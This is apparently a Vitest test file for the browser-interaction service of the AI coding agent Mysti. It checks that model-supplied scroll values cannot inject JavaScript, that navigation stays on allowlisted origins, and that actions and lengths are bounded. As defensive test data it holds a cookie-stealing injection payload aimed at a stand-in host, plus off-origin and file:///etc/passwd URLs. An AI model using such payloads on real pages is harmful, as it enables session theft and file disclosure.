/**
 * Mysti - AI Coding Agent
 * Copyright (c) 2025 DeepMyst Inc. All rights reserved.
 *
 * This file is part of Mysti, licensed under the Apache License, Version 2.0.
 * See the LICENSE file in the project root for full license terms.
 *
 * SPDX-License-Identifier: Apache-2.0
 */

/**
 * BrowserInteractionService — the page-touching half of visual testing.
 *
 * The headline regression pinned here: `scroll` used to build its evaluate
 * script by STRING INTERPOLATION of `interaction.value`, which is model-supplied
 * (`page.evaluate("((dir, amt) => {…})('" + direction + "', 500)")`). That is
 * arbitrary JS execution in the app's own origin. Playwright marshals arguments
 * separately; the only safe form is `evaluate(fn, arg)`, and these tests assert
 * the payload never appears in a source position.
 */
import { describe, it, expect, vi } from 'vitest';
import { BrowserInteractionService, normalizeInteraction } from '../../src/services/BrowserInteractionService';
import type { InteractionContext } from '../../src/services/BrowserInteractionService';
import type { VisualTestInteraction } from '../../src/types';

function makePage() {
  const locator = {
    first: vi.fn().mockReturnThis(),
    click: vi.fn().mockResolvedValue(undefined),
    fill: vi.fn().mockResolvedValue(undefined),
    hover: vi.fn().mockResolvedValue(undefined),
    selectOption: vi.fn().mockResolvedValue(undefined),
  };
  return {
    locator: vi.fn().mockReturnValue(locator),
    evaluate: vi.fn().mockResolvedValue(undefined),
    goto: vi.fn().mockResolvedValue(undefined),
    waitForTimeout: vi.fn().mockResolvedValue(undefined),
    _locator: locator,
  };
}

function ctx(overrides: Partial<InteractionContext> = {}): InteractionContext {
  return {
    policy: 'safe',
    allowedOrigins: ['http://localhost'],
    baseUrl: 'http://localhost:3000',
    ...overrides,
  };
}

const act = (o: Partial<VisualTestInteraction>): VisualTestInteraction =>
  ({ action: 'click', timestamp: 0, ...o }) as VisualTestInteraction;

describe('scroll is never built from a data string', () => {
  it('passes a FUNCTION plus marshalled args, not source text', async () => {
    const svc = new BrowserInteractionService();
    const page = makePage();
    await svc.execute(page, act({ action: 'scroll', value: 'down' }), ctx());

    expect(page.evaluate).toHaveBeenCalledTimes(1);
    const [fn, arg] = page.evaluate.mock.calls[0];
    expect(typeof fn).toBe('function');
    expect(arg).toEqual(['down', 500]);
  });

  it('a JS-injection payload in `value` never reaches a source position', async () => {
    const svc = new BrowserInteractionService();
    const page = makePage();
    const payload = "'); fetch('http://evil/'+document.cookie); ('";

    await svc.execute(page, act({ action: 'scroll', value: payload }), ctx());

    const [fn, arg] = page.evaluate.mock.calls[0];
    // The function source is fixed and extension-authored.
    expect(typeof fn).toBe('function');
    expect(String(fn)).not.toContain('evil');
    // The unrecognised direction is replaced by the default, so the payload is
    // not even present as an argument.
    expect(arg).toEqual(['down', 500]);
    expect(JSON.stringify(arg)).not.toContain('evil');
  });

  it('only the four known directions are honoured', async () => {
    const svc = new BrowserInteractionService();
    for (const dir of ['up', 'down', 'top', 'bottom']) {
      const page = makePage();
      await svc.execute(page, act({ action: 'scroll', value: dir }), ctx());
      expect(page.evaluate.mock.calls[0][1]).toEqual([dir, 500]);
    }
  });
});

describe('navigate cannot leave the allowed origin', () => {
  it('resolves an app-relative path against the session base URL', async () => {
    const svc = new BrowserInteractionService();
    const page = makePage();
    await svc.execute(page, act({ action: 'navigate', value: '/settings' }), ctx());
    expect(page.goto).toHaveBeenCalledWith('http://localhost:3000/settings', expect.anything());
  });

  it('refuses an off-allowlist absolute URL', async () => {
    const svc = new BrowserInteractionService();
    const page = makePage();
    await expect(
      svc.execute(page, act({ action: 'navigate', value: 'http://evil.example/x' }), ctx())
    ).rejects.toThrow(/outside the allowed origins/i);
    expect(page.goto).not.toHaveBeenCalled();
  });

  it('refuses a protocol-relative target', async () => {
    const svc = new BrowserInteractionService();
    const page = makePage();
    await expect(
      svc.execute(page, act({ action: 'navigate', value: '//evil.example/x' }), ctx())
    ).rejects.toThrow();
    expect(page.goto).not.toHaveBeenCalled();
  });

  it('refuses file://', async () => {
    const svc = new BrowserInteractionService();
    const page = makePage();
    await expect(
      svc.execute(page, act({ action: 'navigate', value: 'file:///etc/passwd' }), ctx())
    ).rejects.toThrow();
    expect(page.goto).not.toHaveBeenCalled();
  });
});

describe('interaction policy', () => {
  it('policy "off" refuses every action', async () => {
    const svc = new BrowserInteractionService();
    for (const a of ['click', 'type', 'navigate', 'scroll', 'hover', 'select'] as const) {
      const page = makePage();
      await expect(
        svc.execute(page, act({ action: a, target: '#x', value: 'v' }), ctx({ policy: 'off' }))
      ).rejects.toThrow(/disabled/i);
    }
  });

  it('policy "safe" allows the ordinary actions', async () => {
    const svc = new BrowserInteractionService();
    const page = makePage();
    await svc.execute(page, act({ action: 'click', target: '#save' }), ctx());
    expect(page._locator.click).toHaveBeenCalled();
  });
});

describe('typed values are bounded', () => {
  it('caps a huge type payload', async () => {
    const svc = new BrowserInteractionService();
    const page = makePage();
    await svc.execute(page, act({ action: 'type', target: '#f', value: 'x'.repeat(10_000) }), ctx());
    const [text] = page._locator.fill.mock.calls[0];
    expect(text.length).toBe(4096);
  });
});

describe('normalizeInteraction is the parse boundary', () => {
  it('rejects any action outside the allowlist', () => {
    expect(normalizeInteraction({ action: 'evaluate', value: 'alert(1)' })).toBeNull();
    expect(normalizeInteraction({ action: 'screenshot' })).toBeNull();
    expect(normalizeInteraction({ action: '__proto__' })).toBeNull();
    expect(normalizeInteraction({})).toBeNull();
    expect(normalizeInteraction(null)).toBeNull();
    expect(normalizeInteraction('click')).toBeNull();
    expect(normalizeInteraction([{ action: 'click' }])).toBeNull();
  });

  it('accepts and normalizes a valid action', () => {
    const n = normalizeInteraction({ action: ' CLICK ', target: '  #save  ' });
    expect(n?.action).toBe('click');
    expect(n?.target).toBe('#save');
  });

  it('caps selector and value lengths', () => {
    const n = normalizeInteraction({ action: 'type', target: 'a'.repeat(500), value: 'b'.repeat(9000) });
    expect(n?.target?.length).toBe(200);
    expect(n?.value?.length).toBe(4096);
  });
});
